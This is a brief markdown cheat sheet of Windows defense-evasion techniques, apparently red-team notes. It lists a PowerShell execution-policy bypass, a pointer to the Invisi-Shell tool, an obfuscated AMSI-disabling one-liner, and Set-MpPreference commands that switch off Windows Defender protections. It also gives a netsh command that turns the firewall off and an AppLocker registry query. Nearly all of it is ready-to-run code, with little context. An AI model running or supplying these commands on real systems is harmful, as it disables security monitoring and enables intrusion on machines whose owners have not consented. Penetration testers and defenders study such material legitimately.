# Evasion Teachniques

## PowerShell

### Execution Policy

```
powershell -ep Bypass
```

### Invisi-Shell

We can use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) to bypass other powershell protection mechanisim execpt AMSI:

```
RunWithPathAsAdmin.bat (With admin privileges)
RunWithRegistryNonAdmin.bat (With non-admin privileges)
```
Type exit from the new PowerShell session to complete the clean-up.

### AMSI 

If admin rights are not available:

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Windows Defender:

Disable Windows Defender using powershell (Requires Local Admin rights):

```
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true
```

## Windows Firewall:

Disable Windows Firewall using powershell (Requires Local Admin rights):

```
Netsh Advfirewall set allprofiles state off
```

## AppLocker

Check AppLocker policies using powershell.

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454fa263-2515c8796a5d
```
